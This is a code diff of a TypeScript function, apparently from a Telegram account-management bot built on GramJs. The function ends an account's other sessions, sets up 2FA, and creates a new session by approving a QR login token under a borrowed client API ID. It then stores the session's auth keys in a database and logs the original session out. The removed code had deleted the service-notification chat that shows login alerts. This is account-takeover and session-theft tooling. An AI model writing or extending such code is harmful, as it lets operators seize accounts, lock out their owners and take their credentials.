@@ -151,14 +151,46 @@ export const relogin = async (ID: string) => {
     );
     clients.push(client);
 
-    const currentApiId = await clearAuthorizations(client);
-    if (!currentApiId) {
-      throw Error('CURRENT_API_ID_NOT_FOUND');
+    const prevApiId = await clearAuthorizations(client);
+    if (!prevApiId) {
+      throw Error('PREV_API_ID_NOT_FOUND');
     }
 
     await setup2FA(client, account);
 
-    const { id, phone: phoneNumber } = await getMe(client, ID);
+    const clientReLogin = await initClient(
+      {
+        prefix,
+        accountId: account.accountId,
+        dcId: account.dcId,
+        apiId: 2040,
+        empty: true,
+      },
+      () => {},
+      (error) => sendToMainBot(error)
+    );
+
+    const qrCode = await invokeRequest(
+      clientReLogin,
+      new GramJs.auth.ExportLoginToken({
+        apiId: 2040,
+        apiHash: API_PAIRS[2040],
+        exceptIds: [],
+      })
+    );
+
+    if (!(qrCode instanceof GramJs.auth.LoginToken)) {
+      throw new Error('QR_CODE_NOT_FOUND');
+    }
+
+    await invokeRequest(
+      client,
+      new GramJs.auth.AcceptLoginToken({
+        token: qrCode.token,
+      })
+    );
+
+    const { id, phone: phoneNumber } = await getMe(clientReLogin, ID);
 
     const isExists = await getAccountById(id);
     if (isExists) {
@@ -170,51 +202,6 @@ export const relogin = async (ID: string) => {
       throw new Error('ACCOUNT_ALREADY_EXISTS');
     }
 
-    let finalApiId = currentApiId;
-    // if (!API_PAIRS[finalApiId]) {
-    finalApiId = DEFAULT_API_ID;
-    // }
-
-    const clientReLogin = await initClient(
-      {
-        accountId: id,
-        prefix,
-        dcId: account.dcId,
-        empty: true,
-        apiId: finalApiId,
-      },
-      () => {},
-      (error) => sendToMainBot(error)
-    );
-    clients.push(clientReLogin);
-
-    const codeResult = await requestLoginCode(
-      clientReLogin,
-      phoneNumber,
-      loginCodeHandler.promise,
-      finalApiId
-    );
-
-    if (codeResult.error) {
-      throw Error(codeResult.error);
-    }
-    if (!codeResult.code || !codeResult.phoneCodeHash) {
-      throw Error('CODE_ERROR');
-    }
-
-    const signIn = await invokeRequest(
-      clientReLogin,
-      new GramJs.auth.SignIn({
-        phoneNumber,
-        phoneCodeHash: codeResult.phoneCodeHash,
-        phoneCode: codeResult.code,
-      })
-    );
-
-    if (!signIn || signIn instanceof GramJs.auth.AuthorizationSignUpRequired) {
-      throw Error('SIGN_IN_ERROR');
-    }
-
     const sessionData = clientReLogin.session.getSessionData();
     const { keys, mainDcId } = sessionData;
     if (!keys || !Object.keys(keys) || !mainDcId || !keys[mainDcId]) {
@@ -222,11 +209,12 @@ export const relogin = async (ID: string) => {
     }
 
     const updateId: Record<string, any> = {
+      id,
       accountId: id,
       parentAccountId: ID,
       phone: phoneNumber,
       dcId: Number(mainDcId),
-      nextApiId: finalApiId,
+      nextApiId: 2040,
       prefix,
     };
     updateId[`dc${mainDcId}`] = keys[mainDcId];
@@ -234,24 +222,15 @@ export const relogin = async (ID: string) => {
     const updateID: Record<string, any> = {
       workedOut: true,
       error: null,
-      nextApiId: finalApiId,
+      nextApiId: 2040,
       reloginDate: new Date(),
     };
-    if (finalApiId !== currentApiId) {
-      updateId['prevApiId'] = currentApiId;
-      updateID['prevApiId'] = currentApiId;
+    if (prevApiId !== 2040) {
+      updateId['prevApiId'] = prevApiId;
     }
 
     await updateAccountById(id, updateId);
     await updateAccountById(ID, updateID);
-    await deleteHistory(
-      client,
-      new GramJs.InputPeerUser({
-        userId: BigInt(777000),
-        accessHash: BigInt(0),
-      }),
-      true
-    );
     await invokeRequest(client, new GramJs.auth.LogOut());
 
     console.warn({
@@ -279,7 +258,7 @@ export const relogin = async (ID: string) => {
       for (const client of clients) {
         await client.destroy();
       }
-      
+
       await updateAccountById(ID, {
         banned: true,
         reason: error.message,
